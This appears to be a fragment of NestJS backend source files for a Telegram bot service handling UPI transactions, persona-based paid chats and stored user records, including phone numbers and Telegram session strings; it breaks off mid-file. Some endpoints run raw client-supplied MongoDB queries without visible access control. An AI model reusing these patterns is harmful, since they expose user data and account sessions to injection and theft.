\n  })\n  description: string;\n\n  @ApiProperty({ description: 'Refund method selected by the user' })\n  @Prop({ \n    type: MongooseSchema.Types.String, \n    default: 'undefined',\n    index: true\n  })\n  refundMethod: string;\n\n  @ApiProperty({ description: 'User profile ID' })\n  @Prop({ \n    type: MongooseSchema.Types.String, \n    default: 'undefined',\n    index: true\n  })\n  profile: string;\n\n  @ApiProperty({ description: 'User chat ID' })\n  @Prop({ \n    type: MongooseSchema.Types.String, \n    default: 'undefined',\n    index: true\n  })\n  chatId: string;\n\n  @ApiProperty({ description: 'IP address of the user' })\n  @Prop({ \n    type: MongooseSchema.Types.String, \n    default: 'undefined' \n  })\n  ip: string;\n\n  @ApiProperty({ \n    description: 'Transaction status',\n    enum: TransactionStatus,\n    default: TransactionStatus.PENDING\n  })\n  @Prop({\n    type: MongooseSchema.Types.String,\n    enum: Object.values(TransactionStatus),\n    default: TransactionStatus.PENDING,\n    index: true\n  })\n  status: TransactionStatus;\n\n  @ApiProperty({ description: 'Creation timestamp' })\n  @Prop({ type: Date })\n  createdAt?: Date;\n\n  @ApiProperty({ description: 'Last update timestamp' })\n  @Prop({ type: Date })\n  updatedAt?: Date;\n}\n\nexport const TransactionSchema = SchemaFactory.createForClass(Transaction);\n\n// Compound indexes for common query patterns\nTransactionSchema.index({ chatId: 1, status: 1 });\nTransactionSchema.index({ profile: 1, status: 1 });\nTransactionSchema.index({ createdAt: -1 });\nTransactionSchema.index({ amount: 1, status: 1 });\n","import { Body, Controller, Get, Post, Put, Delete, Param, Query, HttpStatus, ValidationPipe, UsePipes } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiResponse, ApiQuery, ApiParam } from '@nestjs/swagger';\nimport { CreateTransactionDto } from './dto/create-transaction.dto';\nimport { UpdateTransactionDto } from './dto/update-transaction.dto';\nimport { TransactionService } from './transaction.service';\nimport { Transaction } from './schemas/transaction.schema';\n\n@ApiTags('Transactions')\n@Controller('transactions')\nexport class TransactionController {\n  constructor(private readonly transactionService: TransactionService) {}\n\n  @Post()\n  @ApiOperation({\n    summary: 'Create a new transaction',\n    description: 'Creates a new transaction record with the provided details'\n  })\n  @ApiResponse({\n    status: HttpStatus.CREATED,\n    description: 'Transaction created successfully.',\n    type: Transaction\n  })\n  @ApiResponse({\n    status: HttpStatus.BAD_REQUEST,\n    description: 'Invalid input data provided.'\n  })\n  async create(@Body() createTransactionDto: CreateTransactionDto): Promise<Transaction> {\n    return this.transactionService.create(createTransactionDto);\n  }\n\n  @Get(':id')\n  @ApiOperation({\n    summary: 'Get transaction by ID',\n    description: 'Retrieves a specific transaction by its unique identifier'\n  })\n  @ApiParam({\n    name: 'id',\n    description: 'Transaction unique identifier',\n    required: true\n  })\n  @ApiResponse({\n    status: HttpStatus.OK,\n    description: 'Transaction retrieved successfully.',\n    type: Transaction\n  })\n  @ApiResponse({\n    status: HttpStatus.NOT_FOUND,\n    description: 'Transaction not found.'\n  })\n  async findOne(@Param('id') id: string): Promise<Transaction> {\n    return this.transactionService.findOne(id);\n  }\n\n  @Get()\n  @ApiOperation({\n    summary: 'Get all transactions',\n    description: 'Retrieves all transactions with optional filtering, pagination and sorting'\n  })\n  @ApiResponse({\n    status: HttpStatus.OK,\n    description: 'Transactions retrieved successfully.',\n    type: [Transaction]\n  })\n  @ApiQuery({ name: 'transactionId', required: false, description: 'Filter by transaction ID (UTR)' })\n  @ApiQuery({ name: 'amount', required: false, type: 'number', description: 'Filter by transaction amount' })\n  @ApiQuery({ name: 'issue', required: false, description: 'Filter by issue type' })\n  @ApiQuery({ name: 'refundMethod', required: false, description: 'Filter by refund method' })\n  @ApiQuery({ name: 'profile', required: false, description: 'Filter by user profile' })\n  @ApiQuery({ name: 'chatId', required: false, description: 'Filter by chat ID' })\n  @ApiQuery({ name: 'ip', required: false, description: 'Filter by IP address' })\n  @ApiQuery({ name: 'status', required: false, description: 'Filter by transaction status' })\n  @ApiQuery({ name: 'limit', required: false, type: 'number', description: 'Number of records to return', example: 10 })\n  @ApiQuery({ name: 'offset', required: false, type: 'number', description: 'Number of records to skip', example: 0 })\n  async findAll(\n    @Query('transactionId') transactionId?: string,\n    @Query('amount') amount?: number,\n    @Query('issue') issue?: string,\n    @Query('refundMethod') refundMethod?: string,\n    @Query('profile') profile?: string,\n    @Query('chatId') chatId?: string,\n    @Query('ip') ip?: string,\n    @Query('status') status?: string,\n    @Query('limit') limit?: number,\n    @Query('offset') offset?: number,\n  ): Promise<{ transactions: Transaction[]; total: number }> {\n    return this.transactionService.findAll(\n      { transactionId, amount, issue, refundMethod, profile, chatId, status, ip },\n      limit,\n      offset\n    );\n  }\n\n  @Put(':id')\n  @ApiOperation({\n    summary: 'Update a transaction',\n    description: 'Updates an existing transaction by its unique identifier'\n  })\n  @ApiParam({\n    name: 'id',\n    description: 'Transaction unique identifier',\n    required: true\n  })\n  @ApiResponse({\n    status: HttpStatus.OK,\n    description: 'Transaction updated successfully.',\n    type: Transaction\n  })\n  @ApiResponse({\n    status: HttpStatus.NOT_FOUND,\n    description: 'Transaction not found.'\n  })\n  @ApiResponse({\n    status: HttpStatus.BAD_REQUEST,\n    description: 'Invalid input data provided.'\n  })\n  async update(\n    @Param('id') id: string,\n    @Body() updateTransactionDto: UpdateTransactionDto,\n  ): Promise<Transaction> {\n    return this.transactionService.update(id, updateTransactionDto);\n  }\n\n  @Delete(':id')\n  @ApiOperation({\n    summary: 'Delete a transaction',\n    description: 'Deletes a transaction by its unique identifier'\n  })\n  @ApiParam({\n    name: 'id',\n    description: 'Transaction unique identifier',\n    required: true\n  })\n  @ApiResponse({\n    status: HttpStatus.OK,\n    description: 'Transaction deleted successfully.',\n    type: Transaction\n  })\n  @ApiResponse({\n    status: HttpStatus.NOT_FOUND,\n    description: 'Transaction not found.'\n  })\n  async delete(@Param('id') id: string): Promise<Transaction> {\n    return this.transactionService.delete(id);\n  }\n}\n","import { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { TransactionService } from './transaction.service';\nimport { TransactionController } from './transaction.controller';\nimport { Transaction, TransactionSchema } from './schemas/transaction.schema';\nimport { initModule } from '../ConfigurationInit/init.module';\n\n@Module({\n  imports: [\n    initModule,\n    MongooseModule.forFeature([\n      { name: Transaction.name, schema: TransactionSchema },\n    ]),\n  ],\n  controllers: [TransactionController],\n  providers: [TransactionService],\n  exports:[TransactionService]\n})\nexport class TransactionModule {}\n","import { Injectable, NotFoundException, BadRequestException, Logger } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model, isValidObjectId } from 'mongoose';\nimport { CreateTransactionDto } from './dto/create-transaction.dto';\nimport { UpdateTransactionDto } from './dto/update-transaction.dto';\nimport { Transaction, TransactionDocument } from './schemas/transaction.schema';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\nimport e from 'express';\n\n@Injectable()\nexport class TransactionService {\n  private readonly logger = new Logger(TransactionService.name);\n\n  constructor(\n    @InjectModel(Transaction.name) private readonly transactionModel: Model<TransactionDocument>,\n  ) { }\n\n  async create(createTransactionDto: CreateTransactionDto): Promise<Transaction> {\n    this.logger.log(`Creating new transaction: ${JSON.stringify(createTransactionDto)}`);\n    try {\n      // Check if transaction with same ID already exists\n      const existingTransaction = await this.transactionModel\n        .findOne({ transactionId: createTransactionDto.transactionId })\n        .exec();\n\n      if (existingTransaction) {\n        throw new BadRequestException('Transaction with this ID already exists');\n      }\n\n      const newTransaction = new this.transactionModel(createTransactionDto);\n      const savedTransaction = await newTransaction.save();\n      this.logger.log(`Transaction created successfully: ${savedTransaction.transactionId}`);\n      return savedTransaction;\n    } catch (error) {\n      this.logger.error(`Error creating transaction: ${error.message}`, error.stack);\n      throw error instanceof BadRequestException ? error : new BadRequestException('Failed to create transaction');\n    }\n  }\n\n  async findOne(id: string): Promise<Transaction> {\n    this.logger.debug(`Finding transaction by ID: ${id}`);\n    try {\n      const transaction = await this.transactionModel.findById(id).exec();\n      if (!transaction) {\n        this.logger.warn(`Transaction not found with ID: ${id}`);\n        throw new NotFoundException('Transaction not found');\n      }\n      return transaction;\n    } catch (error) {\n      this.logger.error(`Error finding transaction: ${error.message}`, error.stack);\n      if (error instanceof NotFoundException) throw error;\n      throw new BadRequestException('Invalid transaction ID format');\n    }\n  }\n\n  async findAll(\n    filters: {\n      transactionId?: string;\n      amount?: number;\n      issue?: string;\n      refundMethod?: string;\n      profile?: string;\n      chatId?: string;\n      status?: string;\n      ip?: string;\n    },\n    limit = 10,\n    offset = 0,\n  ): Promise<{ transactions: Transaction[]; total: number }> {\n    this.logger.debug(`Finding transactions with filters: ${JSON.stringify(filters)}`);\n    try {\n      let query = {};\n      let transactions: Transaction[] = [];\n      let total = 0;\n\n      // Check each condition sequentially, only moving to the next if no results are found\n      if (filters.transactionId) {\n        // First check transactionId\n        const transactionIdQuery: any = { \n          $or: [\n            { transactionId: filters.transactionId.toLowerCase() }\n          ] \n        };\n        \n        // Only attempt to query by _id if the ID is a valid MongoDB ObjectId\n        if (isValidObjectId(filters.transactionId)) {\n          transactionIdQuery.$or.push({ _id: filters.transactionId });\n        }\n        \n        [transactions, total] = await Promise.all([\n          this.transactionModel\n            .find(transactionIdQuery)\n            .sort({ createdAt: -1 })\n            .skip(offset)\n            .limit(limit)\n            .exec(),\n          this.transactionModel.countDocuments(transactionIdQuery).exec(),\n        ]);\n        \n        if (total > 0) {\n          this.logger.debug(`Found ${total} transactions matching transactionId: ${filters.transactionId}`);\n          await this.sendNotification(filters, total);\n          return { transactions, total };\n        }\n      }\n      \n      if (filters.ip) {\n        // Then check IP if no transaction ID match\n        query = { ip: filters.ip };\n        \n        [transactions, total] = await Promise.all([\n          this.transactionModel\n            .find(query)\n            .sort({ createdAt: -1 })\n            .skip(offset)\n            .limit(limit)\n            .exec(),\n          this.transactionModel.countDocuments(query).exec(),\n        ]);\n        \n        if (total > 0) {\n          this.logger.debug(`Found ${total} transactions matching ip: ${filters.ip}`);\n          await this.sendNotification(filters, total);\n          return { transactions, total };\n        }\n      }\n      \n      if (filters.chatId) {\n        // Then check chatId if no IP match\n        query = { chatId: filters.chatId };\n        \n        [transactions, total] = await Promise.all([\n          this.transactionModel\n            .find(query)\n            .sort({ createdAt: -1 })\n            .skip(offset)\n            .limit(limit)\n            .exec(),\n          this.transactionModel.countDocuments(query).exec(),\n        ]);\n        \n        if (total > 0) {\n          this.logger.debug(`Found ${total} transactions matching chatId: ${filters.chatId}`);\n          await this.sendNotification(filters, total);\n          return { transactions, total };\n        }\n      }\n      \n      // Finally, check remaining filters\n      const remainingFilters = {};\n      \n      if (filters.profile) remainingFilters['profile'] = filters.profile;\n      if (filters.amount) remainingFilters['amount'] = filters.amount;\n      if (filters.issue) remainingFilters['issue'] = filters.issue;\n      if (filters.refundMethod) remainingFilters['refundMethod'] = filters.refundMethod;\n      if (filters.status) remainingFilters['status'] = filters.status;\n      \n      // Only proceed if at least one remaining filter exists\n      if (Object.keys(remainingFilters).length > 0) {\n        query = remainingFilters;\n        \n        [transactions, total] = await Promise.all([\n          this.transactionModel\n            .find(query)\n            .sort({ createdAt: -1 })\n            .skip(offset)\n            .limit(limit)\n            .exec(),\n          this.transactionModel.countDocuments(query).exec(),\n        ]);\n      }\n\n      this.logger.debug(`Found ${total} transactions matching remaining filters`);\n      await this.sendNotification(filters, total);\n      return { transactions, total };\n    } catch (error) {\n      this.logger.error(`Error finding transactions: ${error.message}`, error.stack);\n      throw new BadRequestException('Failed to fetch transactions');\n    }\n  }\n\n  // Helper method to send notification\n  private async sendNotification(filters: any, total: number): Promise<void> {\n    try {\n      await fetchWithTimeout(`${notifbot(process.env.accountsChannel)}&text=${encodeURIComponent(`Found ${total} transactions matching ip: ${filters.ip || 'N/A'}\\nchatId: ${filters.chatId || 'N/A'}\\ntransactionId: ${filters.transactionId || 'N/A'}\\nprofile: ${filters.profile || 'N/A'}`)}`);\n    } catch (error) {\n      this.logger.error(`Failed to send notification: ${error.message}`);\n    }\n  }\n\n  async update(id: string, updateTransactionDto: UpdateTransactionDto): Promise<Transaction> {\n    this.logger.debug(`Updating transaction ${id} with data: ${JSON.stringify(updateTransactionDto)}`);\n    try {\n      const updatedTransaction = await this.transactionModel\n        .findByIdAndUpdate(id, updateTransactionDto, {\n          new: true,\n          runValidators: true\n        })\n        .exec();\n\n      if (!updatedTransaction) {\n        this.logger.warn(`Transaction not found for update with ID: ${id}`);\n        throw new NotFoundException('Transaction not found');\n      }\n\n      this.logger.log(`Transaction ${id} updated successfully`);\n      return updatedTransaction;\n    } catch (error) {\n      this.logger.error(`Error updating transaction: ${error.message}`, error.stack);\n      if (error instanceof NotFoundException) throw error;\n      throw new BadRequestException('Failed to update transaction');\n    }\n  }\n\n  async delete(id: string): Promise<Transaction> {\n    this.logger.debug(`Deleting transaction: ${id}`);\n    try {\n      const deletedTransaction = await this.transactionModel.findByIdAndDelete(id).exec();\n      if (!deletedTransaction) {\n        this.logger.warn(`Transaction not found for deletion with ID: ${id}`);\n        throw new NotFoundException('Transaction not found');\n      }\n      this.logger.log(`Transaction ${id} deleted successfully`);\n      return deletedTransaction;\n    } catch (error) {\n      this.logger.error(`Error deleting transaction: ${error.message}`, error.stack);\n      if (error instanceof NotFoundException) throw error;\n      throw new BadRequestException('Failed to delete transaction');\n    }\n  }\n}\n","import { Controller, Get, Body, Patch } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\nimport { UpiIdService } from './upi-ids.service';\n\n@ApiTags('UPI Ids')\n@Controller('upi-ids')\nexport class UpiIdController {\n  constructor(private readonly UpiIdService: UpiIdService) { }\n\n  @Get()\n  @ApiOperation({ summary: 'Get Upi Ids' })\n  async findOne(): Promise<any> {\n    return this.UpiIdService.findOne();\n  }\n\n  @Patch()\n  @ApiOperation({ summary: 'Update Upi Ids' })\n  @ApiBody({ type: Object })\n  async update(@Body() updateUpiIdsdto: any): Promise<any> {\n    return this.UpiIdService.update(updateUpiIdsdto);\n  }\n\n}\n","import { Module, Global } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { UpiIdService } from './upi-ids.service';\nimport { UpiIdController } from './upi-ids.controller';\nimport { UpiIdSchema } from './upi-ids.schema';\nimport { NpointModule } from '../n-point/npoint.module';\n\n@Global()\n@Module({\n  imports: [\n    UpiIdModule,\n    NpointModule,\n    MongooseModule.forFeature([{ name: 'UpiIdModule', collection: 'upi-ids', schema: UpiIdSchema }]),\n  ],\n  providers: [UpiIdService],\n  controllers: [UpiIdController],\n  exports: [UpiIdService],\n})\nexport class UpiIdModule { }","import { Schema, SchemaFactory } from '@nestjs/mongoose';\nimport mongoose, { Document } from 'mongoose';\n\nexport type UpiIdDocument = UpiId & Document;\n\n@Schema({\n  versionKey: false,\n  autoIndex: true,\n  timestamps: false,\n  toJSON: {\n    virtuals: false,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n})\nexport class UpiId { }\n\nexport const UpiIdSchema = SchemaFactory.createForClass(UpiId);\nUpiIdSchema.add({ type: mongoose.Schema.Types.Mixed });\n\n","import { Injectable, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { UpiId } from './upi-ids.schema';\nimport axios from 'axios';\nimport { areJsonsNotSame } from '../../utils';\nimport { NpointService } from '../n-point/npoint.service';\n\n@Injectable()\nexport class UpiIdService {\n    private upiIds = {}\n    constructor(@InjectModel('UpiIdModule') private UpiIdModel: Model<UpiId>,\n        private npointSerive: NpointService\n    ) {\n        this.findOne().then(() => {\n            setInterval(async () => {\n                await this.refreshUPIs();\n                await this.checkNpoint();\n            }, 5 * 60000);\n        });\n    }\n\n    async OnModuleInit() {\n        console.log(\"Config Module Inited\")\n    }\n\n    async refreshUPIs() {\n        console.log(\"Refreshing UPIs\");\n        const result = await this.UpiIdModel.findOne({}).lean().exec();\n        if (result) {\n            this.upiIds = result;\n        }\n    }\n\n    async checkNpoint() {\n        const upiIds = (await axios.get('https://api.npoint.io/54baf762fd873c55c6b1')).data;\n        const existingUpiIds = await this.findOne();\n        if (areJsonsNotSame(upiIds, existingUpiIds)) {\n            await this.npointSerive.updateDocument(\"54baf762fd873c55c6b1\", existingUpiIds)\n        }\n    }\n\n    async findOne(): Promise<any> {\n        if (Object.keys(this.upiIds).length > 0) {\n            return this.upiIds;\n        }\n        const result = await this.UpiIdModel.findOne({}).lean().exec();\n        if (!result) return null;\n\n        this.upiIds = result;\n        console.log(\"Refreshed UPIs\");\n        return result;\n    }\n\n    async update(updateClientDto: any): Promise<any> {\n        delete updateClientDto['_id']\n        const updatedUser = await this.UpiIdModel.findOneAndUpdate(\n            {},\n            { $set: { ...updateClientDto } },\n            { new: true, upsert: true, lean: true }\n        ).exec();\n\n        if (!updatedUser) {\n            throw new NotFoundException(`UpiIdModel not found`);\n        }\n\n        this.upiIds = updatedUser;\n        console.log(\"Refreshed UPIs\")\n        return updatedUser;\n    }\n\n}\n","import { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateUserDataDto {\n    @ApiProperty({ example: '5787751360', description: 'Chat ID' })\n    chatId: string;\n\n    @ApiProperty({ example: 1, description: 'Total count' })\n    totalCount: number;\n\n    @ApiProperty({ example: 0, description: 'Picture count' })\n    picCount: number;\n\n    @ApiProperty({ example: 1718802722566, description: 'Last message timestamp' })\n    lastMsgTimeStamp: number;\n\n    @ApiProperty({ example: 1718802742567, description: 'Limit time' })\n    limitTime: number;\n\n    @ApiProperty({ example: 0, description: 'Paid count' })\n    paidCount: number;\n\n    @ApiProperty({ example: 0, description: 'Profile count' })\n    prfCount: number;\n\n    @ApiProperty({ example: 1, description: 'Can reply' })\n    canReply: number;\n\n    @ApiProperty({ example: 0, description: 'Pay amount' })\n    payAmount: number;\n\n    @ApiProperty({ example: 0, description: 'highestPayAmount' })\n    highestPayAmount: number;\n\n    @ApiProperty({ example: 0, description: 'cheatCount', default: 0 })\n    cheatCount: number;\n\n    @ApiProperty({ example: 0, description: 'callTime', default: 0 })\n    callTime: number;\n\n    @ApiProperty({ example: '  ', description: 'Username' })\n    username: string;\n\n    @ApiProperty({ example: '-7250939091939055173', description: 'Access hash' })\n    accessHash: string;\n\n    @ApiProperty({ example: true, description: 'Paid reply status' })\n    paidReply: boolean;\n\n    @ApiProperty({ example: false, description: 'Demo given status' })\n    demoGiven: boolean;\n\n    @ApiProperty({ example: false, description: 'Second show status' })\n    secondShow: boolean;\n\n    @ApiProperty({ example: 'sneha', description: 'Profile name' })\n    profile: string;\n\n    @ApiProperty({ example: false, description: 'Pics Sent status' })\n    picsSent: boolean;\n\n    @ApiProperty({ example: [], description: 'videos' })\n    videos: number[];\n}\n","import { ApiPropertyOptional } from '@nestjs/swagger';\nimport { Transform, TransformFnParams } from 'class-transformer';\n\nexport class SearchDto {\n  @ApiPropertyOptional({ description: 'Total count', type: Number })\n  totalCount?: number;\n\n  @ApiPropertyOptional({ description: 'Picture count', type: Number })\n  picCount?: number;\n\n  @ApiPropertyOptional({ description: 'Last message timestamp', type: Number })\n  lastMsgTimeStamp?: number;\n\n  @ApiPropertyOptional({ description: 'Limit time', type: Number })\n  limitTime?: number;\n\n  @ApiPropertyOptional({ description: 'Paid count', type: Number })\n  paidCount?: number;\n\n  @ApiPropertyOptional({ description: 'Profile count', type: Number })\n  prfCount?: number;\n\n  @ApiPropertyOptional({ description: 'Can reply', type: Number })\n  canReply?: number;\n\n  @ApiPropertyOptional({ description: 'Pay amount', type: Number })\n  payAmount?: number;\n\n  @ApiPropertyOptional({ description: 'Username' })\n  username?: string;\n\n  @ApiPropertyOptional({ description: 'Access hash' })\n  accessHash?: string;\n\n  @ApiPropertyOptional({ description: 'Paid reply status', type: Boolean })\n  paidReply?: boolean;\n\n  @ApiPropertyOptional({ description: 'Demo given status', type: Boolean })\n  demoGiven?: boolean;\n\n  @ApiPropertyOptional({ description: 'Second show status', type: Boolean })\n  secondShow?: boolean;\n\n  @ApiPropertyOptional({ description: 'Profile name' })\n  @Transform(({ value }: TransformFnParams) => value?.trim().toLowerCase())\n  profile?: string;\n\n  @ApiPropertyOptional({ description: 'Chat ID' })\n  chatId?: string;\n\n  @ApiPropertyOptional({ description: 'Pics Sent status' })\n  picsSent?: boolean;\n}\n","import { PartialType } from '@nestjs/swagger';\nimport { CreateUserDataDto } from './create-user-data.dto';\n\nexport class UpdateUserDataDto extends PartialType(CreateUserDataDto) {}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\n\nexport type UserDataDocument = UserData & Document;\n\n@Schema({\n    collection: 'userData', versionKey: false, autoIndex: true, timestamps: true,\n    toJSON: {\n        virtuals: true,\n        transform: (doc, ret) => {\n            delete ret._id;\n        },\n    },\n})\nexport class UserData {\n    @Prop({ required: true })\n    chatId: string;\n\n    @Prop({ required: true })\n    totalCount: number;\n\n    @Prop({ required: true })\n    picCount: number;\n\n    @Prop({ required: true })\n    lastMsgTimeStamp: number;\n\n    @Prop({ required: true })\n    limitTime: number;\n\n    @Prop({ required: true })\n    paidCount: number;\n\n    @Prop({ required: true })\n    prfCount: number;\n\n    @Prop({ required: true })\n    canReply: number;\n\n    @Prop({ required: true })\n    payAmount: number;\n\n    @Prop({ required: true })\n    username: string;\n\n    @Prop({ required: true })\n    accessHash: string;\n\n    @Prop({ required: true })\n    paidReply: boolean;\n\n    @Prop({ required: true })\n    demoGiven: boolean;\n\n    @Prop({ required: true })\n    secondShow: boolean;\n\n    @Prop({ required: true, default: 0 })\n    fullShow: number;\n\n    @Prop({ required: true })\n    profile: string;\n\n    @Prop({ required: true })\n    picSent: boolean;\n\n    @Prop({ required: true })\n    highestPayAmount: number;\n\n    @Prop({ required: true })\n    cheatCount: number;\n\n    @Prop({ required: true })\n    callTime: number;\n\n    @Prop({ required: false, default:[] })\n    videos: number[];\n}\n\nexport const UserDataSchema = SchemaFactory.createForClass(UserData);\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiResponse, ApiQuery } from '@nestjs/swagger';\nimport { UserDataService } from './user-data.service';\nimport { CreateUserDataDto } from './dto/create-user-data.dto';\nimport { UserData } from './schemas/user-data.schema';\nimport { SearchDto } from './dto/search-user-data.dto';\nimport { UpdateUserDataDto } from './dto/update-user-data.dto';\n\n@ApiTags('UserData of TG clients')\n@Controller('userData')\nexport class UserDataController {\n  constructor(private readonly userDataService: UserDataService) {}\n\n  @Post()\n  @ApiOperation({ summary: 'Create user data' })\n  async create(@Body() createUserDataDto: CreateUserDataDto): Promise<UserData> {\n    return this.userDataService.create(createUserDataDto);\n  }\n\n  @Get('search')\n  @ApiOperation({ summary: 'Search user data' })\n  @ApiQuery({ name: 'profile', required: false, description: 'User profile' })\n  @ApiQuery({ name: 'chatId', required: false, description: 'Chat ID' })\n  @ApiQuery({ name: 'isTesting', required: false, type: Boolean })\n  @ApiQuery({ name: 'banned', required: false, type: Boolean })\n  async search(@Query() query: SearchDto): Promise<UserData[]> {\n    return this.userDataService.search(query);\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all user data' })\n  async findAll(): Promise<UserData[]> {\n    return this.userDataService.findAll();\n  }\n\n\n  @Patch('updateAll/:chatId')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  async updateAll(@Param('chatId') chatId: string, @Body() updateUserDataDto: UpdateUserDataDto): Promise<any> {\n    return this.userDataService.updateAll(chatId, updateUserDataDto);\n  }\n\n\n  @Get(':profile/:chatId')\n  @ApiOperation({ summary: 'Get user data by ID' })\n  async findOne(@Param('profile') profile: string, @Param('chatId') chatId: string): Promise<UserData> {\n    return this.userDataService.findOne(profile, chatId);\n  }\n\n  @Patch(':profile/:chatId')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  async update(@Param('profile') profile: string, @Param('chatId') chatId: string, @Body() updateUserDataDto: UpdateUserDataDto): Promise<UserData> {\n    return this.userDataService.update(profile, chatId, updateUserDataDto);\n  }\n\n  @Delete(':profile/:chatId')\n  @ApiOperation({ summary: 'Delete user data by ID' })\n  async remove(@Param('profile') profile: string, @Param('chatId') chatId: string): Promise<UserData> {\n    return this.userDataService.remove(profile, chatId);\n  }\n\n  @Get('clear-count')\n  clearCount(@Query('chatId') chatId?: string) {\n    return this.userDataService.clearCount(chatId);\n  }\n\n  @Post('query')\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\n  async executeQuery(@Body() requestBody: any): Promise<any> {\n    try {\n      const { query, sort, limit, skip } = requestBody;\n      return await this.userDataService.executeQuery(query, sort, limit, skip);\n    } catch (error) {\n      throw error;\n    }\n  }\n}\n","import { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { UserData, UserDataSchema } from './schemas/user-data.schema';\nimport { UserDataService } from './user-data.service';\nimport { UserDataController } from './user-data.controller';\nimport { initModule } from '../ConfigurationInit/init.module';\n\n@Module({\n  imports: [\n    initModule,\n    MongooseModule.forFeature([{ name: UserData.name, schema: UserDataSchema, collection: \"userData\" }])],\n  controllers: [UserDataController],\n  providers: [UserDataService],\n  exports: [UserDataService]\n})\nexport class UserDataModule { }\n","import { BadRequestException, Injectable, InternalServerErrorException, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { UserData, UserDataDocument } from './schemas/user-data.schema';\nimport { CreateUserDataDto } from './dto/create-user-data.dto';\nimport { UpdateUserDataDto } from './dto/update-user-data.dto';\nimport { parseError } from '../../utils/parseError';\n\n@Injectable()\nexport class UserDataService {\n    private callCounts: Map<string, number> = new Map();\n    constructor(@InjectModel(UserData.name) private userDataModel: Model<UserDataDocument>) {}\n\n    async create(createUserDataDto: CreateUserDataDto): Promise<UserData> {\n        const createdUser = new this.userDataModel(createUserDataDto);\n        return createdUser.save();\n    }\n\n    async findAll(): Promise<UserData[]> {\n        return await this.userDataModel.find().exec();\n    }\n\n    async findOne(profile: string, chatId: string): Promise<UserData & { count?: number }> {\n        const user = (await this.userDataModel.findOne({ profile, chatId }).exec())?.toJSON();\n        if (!user) {\n            console.warn(`UserData with ID \"${profile} - ${chatId}\" not found`);\n        }\n        const currentCount = this.callCounts.get(chatId) || 0;\n        this.callCounts.set(chatId, currentCount + 1);\n        if (user) {\n            return { ...user, count: this.callCounts.get(chatId) };\n        } else {\n            return undefined\n        }\n    }\n\n    clearCount(chatId?: string): string {\n        if (chatId) {\n            this.callCounts.delete(chatId);\n            return `Count cleared for chatId: ${chatId}`;\n        } else {\n            this.callCounts.clear();\n            return 'All counts cleared.';\n        }\n    }\n\n    async update(profile: string, chatId: string, updateUserDataDto: UpdateUserDataDto): Promise<UserData> {\n        delete updateUserDataDto['_id']\n        console.log(updateUserDataDto)\n        const updatedUser = await this.userDataModel.findOneAndUpdate({ profile, chatId }, { $set: updateUserDataDto }, { new: true, upsert: true }).exec();\n        if (!updatedUser) {\n            console.warn(`UserData with ID \"${chatId}\" not found`);\n        }\n        return updatedUser;\n    }\n\n    async updateAll(chatId: string, updateUserDataDto: UpdateUserDataDto): Promise<any> {\n        delete updateUserDataDto['_id']\n        const updatedUser = await this.userDataModel.updateMany({ chatId }, { $set: updateUserDataDto }, { new: true, upsert: true }).exec();\n        if (!updatedUser) {\n            console.warn(`UserData with ID \"${chatId}\" not found`);\n        }\n        return updatedUser;\n    }\n\n    async remove(profile: string, chatId: string): Promise<UserData> {\n        const deletedUser = await this.userDataModel.findOneAndDelete({ profile, chatId }).exec();\n        if (!deletedUser) {\n            console.warn(`UserData with ID \"${chatId}\" not found`);\n        }\n        return deletedUser;\n    }\n\n    async search(filter: any): Promise<UserData[]> {\n        console.log(filter)\n        if (filter.firstName) {\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\n        }\n        console.log(filter)\n        return this.userDataModel.find(filter).exec();\n    }\n\n    async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<UserData[]> {\n        try {\n            if (!query) {\n                throw new BadRequestException('Query is invalid.');\n            }\n            const queryExec = this.userDataModel.find(query);\n\n            if (sort) {\n                queryExec.sort(sort);\n            }\n\n            if (limit) {\n                queryExec.limit(limit);\n            }\n\n            if (skip) {\n                queryExec.skip(skip);\n            }\n\n            return await queryExec.exec();\n        } catch (error) {\n            throw new InternalServerErrorException(error.message);\n        }\n    }\n\n    async resetPaidUsers() {\n        try {\n            const entry = await this.userDataModel.updateMany({ $and: [{ payAmount: { $gt: 10 }, totalCount: { $gt: 30 } }] }, {\n                $set: {\n                    totalCount: 10,\n                    limitTime: Date.now(),\n                    paidReply: true\n                }\n            });\n        } catch (error) {\n            parseError(error)\n        }\n    }\n}\n","import { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\n\nexport class CreateUserDto {\n  @ApiProperty({ description: 'Mobile number of the user', example: '917330803480' })\n  mobile: string;\n\n  @ApiProperty({ description: 'Session information of the user', example: 'string' })\n  session: string;\n\n  @ApiProperty({ description: 'First name of the user', example: 'Praveen' })\n  firstName: string;\n\n  @ApiProperty({ description: 'Last name of the user', example: null })\n  lastName?: string | null;\n\n  @ApiProperty({ description: 'Username of the user', example: null })\n  username?: string | null;\n\n  @ApiProperty({ description: 'Number of channels', example: 56 })\n  channels: number;\n\n  @ApiProperty({ description: 'Number of personal chats', example: 74 })\n  personalChats: number;\n\n  @ApiProperty({ description: 'Number of messages', example: 0 })\n  msgs: number;\n\n  @ApiProperty({ description: 'Total number of chats', example: 195 })\n  totalChats: number;\n\n  @ApiProperty({ description: 'Timestamp of last active', example: '2024-06-03' })\n  lastActive: string;\n\n  @ApiProperty({ description: 'Telegram ID of 